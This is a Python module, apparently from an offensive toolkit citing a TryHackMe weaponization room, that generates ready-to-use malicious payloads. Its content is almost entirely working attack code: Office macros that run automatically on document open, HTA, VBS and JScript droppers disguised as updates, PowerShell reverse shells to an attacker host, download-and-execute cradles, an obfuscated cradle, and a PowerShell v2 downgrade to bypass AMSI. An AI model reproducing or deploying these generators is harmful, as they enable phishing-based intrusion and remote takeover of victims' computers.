"""venom37 weaponize -- macro payloads, HTA droppers, and phishing templates.

Techniques from TryHackMe Weaponization room:
- VBA macro payloads (Word/Excel)
- HTA (HTML Application) droppers
- Windows Script Host (WSH) payloads
- PowerShell delivery methods
- Phishing payload wrappers

All payloads are generated as strings -- no file I/O unless explicitly requested.
"""
from __future__ import annotations

import base64
import random
import string


class MacroGenerator:
    """Generate VBA macro payloads for Office documents.

    From THM Weaponization: VBA macros execute when documents are opened.
    AutoOpen() and Document_Open() run automatically on Word docs.
    Workbook_Open() runs on Excel.
    """

    @staticmethod
    def reverse_shell(lhost: str, lport: int, method: str = "powershell") -> str:
        """Generate VBA macro that spawns a reverse shell.

        Args:
            lhost: Attacker IP
            lport: Attacker port
            method: Delivery method (powershell, cmd, wscript)
        """
        if method == "powershell":
            ps_payload = (
                "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                "$stream = $client.GetStream();"
                "[byte[]]$bytes = 0..65535|%{{0}};"
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                "$sendback = (iex $data 2>&1 | Out-String);"
                "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                "$stream.Write($sendbyte,0,$sendbyte.Length);"
                "$stream.Flush()}};"
                "$client.Close()"
            ).format(lhost=lhost, lport=lport)

            # Base64 encode for -enc flag
            ps_b64 = base64.b64encode(ps_payload.encode("utf-16le")).decode()

            return (
                "Sub AutoOpen()\n"
                "    MyMacro\n"
                "End Sub\n"
                "\n"
                "Sub Document_Open()\n"
                "    MyMacro\n"
                "End Sub\n"
                "\n"
                "Sub MyMacro()\n"
                "    Dim str As String\n"
                '    str = "powershell -nop -w hidden -enc {b64}"\n'
                '    Shell str, vbHide\n'
                "End Sub\n"
            ).format(b64=ps_b64)

        elif method == "cmd":
            return (
                "Sub AutoOpen()\n"
                "    MyMacro\n"
                "End Sub\n"
                "\n"
                "Sub Document_Open()\n"
                "    MyMacro\n"
                "End Sub\n"
                "\n"
                "Sub MyMacro()\n"
                "    Dim str As String\n"
                '    str = "cmd /c powershell -nop -w hidden -c ""'
                "$c = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                '$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};'
                'while(($i = $s.Read($b,0,$b.Length)) -ne 0){{'
                '$d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
                '$r = (iex $d 2>&1 | Out-String);'
                '$sb = ([text.encoding]::ASCII).GetBytes($r);'
                '$s.Write($sb,0,$sb.Length);$s.Flush()}};'
                '$c.Close()"""\n'
                '    Shell str, vbHide\n'
                "End Sub\n"
            ).format(lhost=lhost, lport=lport)

        elif method == "wscript":
            return (
                "Sub AutoOpen()\n"
                "    MyMacro\n"
                "End Sub\n"
                "\n"
                "Sub Document_Open()\n"
                "    MyMacro\n"
                "End Sub\n"
                "\n"
                "Sub MyMacro()\n"
                "    Dim sh As Object\n"
                '    Set sh = CreateObject("WScript.Shell")\n'
                '    sh.Run "powershell -nop -w hidden -c ""'
                "IEX(New-Object Net.WebClient).DownloadString("
                "'http://{lhost}:{lport}/shell.ps1')"
                '""", 0, False\n'
                "End Sub\n"
            ).format(lhost=lhost, lport=lport)

        raise ValueError("Unknown method: " + method)

    @staticmethod
    def download_exec(url: str, filename: str = "update.exe") -> str:
        """Generate VBA macro that downloads and executes a file."""
        return (
            "Sub AutoOpen()\n"
            "    DownloadAndRun\n"
            "End Sub\n"
            "\n"
            "Sub Document_Open()\n"
            "    DownloadAndRun\n"
            "End Sub\n"
            "\n"
            "Sub DownloadAndRun()\n"
            "    Dim url As String\n"
            "    Dim savePath As String\n"
            "    Dim sh As Object\n"
            '    url = "{url}"\n'
            '    savePath = Environ("TEMP") & "\\{filename}"\n'
            '    Set sh = CreateObject("WScript.Shell")\n'
            "    \n"
            '    Dim cmd As String\n'
            '    cmd = "powershell -nop -w hidden -c ""'
            "(New-Object Net.WebClient).DownloadFile("
            "'{url}', $env:TEMP + '\\{filename}');"
            'Start-Process $env:TEMP\\{filename}"""\n'
            '    sh.Run cmd, 0, False\n'
            "End Sub\n"
        ).format(url=url, filename=filename)

    @staticmethod
    def excel_reverse_shell(lhost: str, lport: int) -> str:
        """Generate Excel-specific macro (Workbook_Open)."""
        ps_payload = (
            "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback = (iex $data 2>&1 | Out-String);"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};"
            "$client.Close()"
        ).format(lhost=lhost, lport=lport)
        ps_b64 = base64.b64encode(ps_payload.encode("utf-16le")).decode()

        return (
            "Private Sub Workbook_Open()\n"
            "    Dim str As String\n"
            '    str = "powershell -nop -w hidden -enc {b64}"\n'
            '    Shell str, vbHide\n'
            "End Sub\n"
        ).format(b64=ps_b64)


class HTAGenerator:
    """Generate HTA (HTML Application) droppers.

    From THM Weaponization: HTA files run as trusted applications
    and can execute VBScript/JScript with full system access.
    Delivered via mshta.exe which is a signed Microsoft binary (LOLBin).
    """

    @staticmethod
    def reverse_shell(lhost: str, lport: int) -> str:
        """Generate HTA that spawns a PowerShell reverse shell."""
        ps_payload = (
            "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback = (iex $data 2>&1 | Out-String);"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};"
            "$client.Close()"
        ).format(lhost=lhost, lport=lport)
        ps_b64 = base64.b64encode(ps_payload.encode("utf-16le")).decode()

        return (
            "<html>\n"
            "<head>\n"
            "<title>Update Required</title>\n"
            '<HTA:APPLICATION ID="app" APPLICATIONNAME="Update"\n'
            ' BORDER="thin" BORDERSTYLE="normal" CAPTION="yes"\n'
            ' ICON="shdocvw.dll,1" MAXIMIZEBUTTON="no"\n'
            ' MINIMIZEBUTTON="no" SHOWINTASKBAR="no"\n'
            ' SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize">\n'
            "</head>\n"
            "<body>\n"
            '<script language="VBScript">\n'
            "  Set sh = CreateObject(\"WScript.Shell\")\n"
            '  sh.Run "powershell -nop -w hidden -enc {b64}", 0, False\n'
            "  self.close\n"
            "</script>\n"
            "</body>\n"
            "</html>\n"
        ).format(b64=ps_b64)

    @staticmethod
    def download_exec(url: str, filename: str = "update.exe") -> str:
        """Generate HTA that downloads and executes a file."""
        return (
            "<html>\n"
            "<head>\n"
            "<title>Loading...</title>\n"
            '<HTA:APPLICATION ID="app" WINDOWSTATE="minimize"\n'
            ' SHOWINTASKBAR="no" SYSMENU="no">\n'
            "</head>\n"
            "<body>\n"
            '<script language="VBScript">\n'
            '  Set sh = CreateObject("WScript.Shell")\n'
            '  sh.Run "powershell -nop -w hidden -c ""'
            "(New-Object Net.WebClient).DownloadFile("
            "'{url}', $env:TEMP + '\\{filename}');"
            'Start-Process $env:TEMP\\{filename}""", 0, False\n'
            "  self.close\n"
            "</script>\n"
            "</body>\n"
            "</html>\n"
        ).format(url=url, filename=filename)

    @staticmethod
    def mshta_oneliner(hta_url: str) -> str:
        """Generate mshta.exe one-liner to execute remote HTA."""
        return "mshta {}".format(hta_url)


class WSHGenerator:
    """Generate Windows Script Host payloads (.vbs, .js).

    From THM Weaponization: WSH allows running scripts via
    wscript.exe or cscript.exe -- trusted Windows binaries.
    """

    @staticmethod
    def vbs_reverse_shell(lhost: str, lport: int) -> str:
        """Generate VBS file that spawns a PowerShell reverse shell."""
        ps_b64 = base64.b64encode(
            ("$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
             "$stream = $client.GetStream();"
             "[byte[]]$bytes = 0..65535|%{{0}};"
             "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
             "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
             "$sendback = (iex $data 2>&1 | Out-String);"
             "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
             "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
             "$stream.Write($sendbyte,0,$sendbyte.Length);"
             "$stream.Flush()}};"
             "$client.Close()").format(lhost=lhost, lport=lport)
            .encode("utf-16le")
        ).decode()

        return (
            'Set sh = CreateObject("WScript.Shell")\n'
            'sh.Run "powershell -nop -w hidden -enc {b64}", 0, False\n'
        ).format(b64=ps_b64)

    @staticmethod
    def js_reverse_shell(lhost: str, lport: int) -> str:
        """Generate JScript file that spawns a PowerShell reverse shell."""
        ps_b64 = base64.b64encode(
            ("$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
             "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
             "while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
             "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
             "$r=(iex $d 2>&1|Out-String);"
             "$sb=([text.encoding]::ASCII).GetBytes($r);"
             "$s.Write($sb,0,$sb.Length);$s.Flush()}};"
             "$c.Close()").format(lhost=lhost, lport=lport)
            .encode("utf-16le")
        ).decode()

        return (
            'var sh = new ActiveXObject("WScript.Shell");\n'
            'sh.Run("powershell -nop -w hidden -enc {b64}", 0, false);\n'
        ).format(b64=ps_b64)

    @staticmethod
    def download_exec_vbs(url: str, filename: str = "update.exe") -> str:
        """Generate VBS downloader + executor."""
        return (
            'Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")\n'
            'Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")\n'
            'xHttp.Open "GET", "{url}", False\n'
            "xHttp.Send\n"
            "\n"
            "With bStrm\n"
            "    .Type = 1\n"
            "    .Open\n"
            "    .write xHttp.responseBody\n"
            '    .savetofile Environ("TEMP") & "\\{filename}", 2\n'
            "End With\n"
            "\n"
            'Set sh = CreateObject("WScript.Shell")\n'
            'sh.Run Environ("TEMP") & "\\{filename}", 0, False\n'
        ).format(url=url, filename=filename)


class PowerShellDelivery:
    """PowerShell payload delivery methods.

    From THM Weaponization: PowerShell is the most versatile
    delivery mechanism on Windows. Can download, execute, and
    establish persistence all in one line.
    """

    @staticmethod
    def download_cradle(url: str) -> str:
        """Classic IEX download cradle."""
        return "IEX(New-Object Net.WebClient).DownloadString('{}')".format(url)

    @staticmethod
    def download_cradle_obfuscated(url: str) -> str:
        """Obfuscated download cradle with string splitting."""
        parts = []
        for i in range(0, len(url), random.randint(5, 10)):
            end = min(i + random.randint(5, 10), len(url))
            parts.append("'{}'".format(url[i:end]))
            if end >= len(url):
                break

        url_concat = "+".join(parts)
        return (
            "$u={};"
            "$w=New-Object ('Net'+'.Web'+'Client');"
            "IEX($w.('Down'+'load'+'String').Invoke($u))"
        ).format(url_concat)

    @staticmethod
    def encoded_command(cmd: str) -> str:
        """Wrap command in -EncodedCommand for execution."""
        b64 = base64.b64encode(cmd.encode("utf-16le")).decode()
        return "powershell -nop -w hidden -enc {}".format(b64)

    @staticmethod
    def constrained_language_bypass() -> str:
        """PowerShell Constrained Language Mode bypass using PS v2 downgrade."""
        return (
            "# CLM bypass via PowerShell v2 downgrade (AMSI not loaded in v2)\n"
            "powershell -Version 2 -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')\"\n"
            "\n"
            "# Check current language mode:\n"
            "# $ExecutionContext.SessionState.LanguageMode"
        )
